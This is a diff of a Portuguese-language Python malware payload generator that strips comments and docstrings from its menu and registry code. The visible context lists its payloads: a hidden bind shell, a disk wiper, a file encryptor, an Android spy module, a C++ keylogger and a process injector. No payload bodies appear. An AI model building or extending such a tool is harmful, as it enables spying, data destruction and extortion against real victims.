@@ -46,7 +46,7 @@ class GeradorPayloadsElite:
                 'description': 'Bind Shell com técnicas de ocultação'
             },
             
-            # Payloads destrutivos
+
             'limpar_disco': {
                 'function': self.gerar_limpador_disco,
                 'category': 'Destrutivos',
@@ -60,15 +60,14 @@ class GeradorPayloadsElite:
                 'description': 'Criptografa arquivos com algoritmo híbrido'
             },
             
-            # Payloads para Termux
+         
             'termux_espiao': {
                 'function': self.gerar_termux_espiao,
                 'category': 'Termux',
                 'danger_level': 'high',
                 'description': 'Módulo de espionagem para Android'
             },
-            
-            # Payloads em C++
+     
             'cpp_keylogger': {
                 'function': self.gerar_cpp_keylogger,
                 'category': 'C++',
@@ -76,7 +75,7 @@ class GeradorPayloadsElite:
                 'description': 'Keylogger em C++ com anti-debug'
             },
             
-            # Técnicas avançadas
+    
             'injetor_processo': {
                 'function': self.gerar_injetor_processo,
                 'category': 'Avançados',
@@ -201,7 +200,7 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
 """
     
     def _verificar_dependencias(self):
-        """Verifica e instala dependências automaticamente"""
+      
         required = {
             'cryptography': 'cryptography',
             'pycryptodome': 'pycryptodomex',
@@ -232,7 +231,7 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
                 time.sleep(1)
     
     def _confirmar(self, mensagem: str, nivel_perigo: str = None) -> bool:
-        """Exibe um prompt de confirmação estilizado conforme o nível de perigo"""
+     
         if nivel_perigo == 'high':
             return Confirm.ask(
                 f"[blink red]☠️ {mensagem}[/blink red]",
@@ -247,7 +246,7 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
             return Confirm.ask(f"[yellow]? {mensagem}[/yellow]")
     
     def _criar_progresso(self) -> Progress:
-        """Cria uma barra de progresso estilizada"""
+     
         return Progress(
             TextColumn("[progress.description]{task.description}"),
             BarColumn(bar_width=None, complete_style="red", finished_style="red"),
@@ -320,7 +319,7 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
                 self._sair()
     
     def _mostrar_submenu(self, categoria: str):
-        """Mostra um submenu para uma categoria específica"""
+    
         payloads_categoria = {k: v for k, v in self.payloads.items() if v['category'] == categoria}
         
         while True:
@@ -370,7 +369,7 @@ dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
             self._processar_payload(nome_payload)
     
     def _processar_payload(self, nome_payload: str):
-        """Processa a geração de um payload específico"""
+     
         payload_data = self.payloads[nome_payload]
         
         # Verificação para payloads perigosos
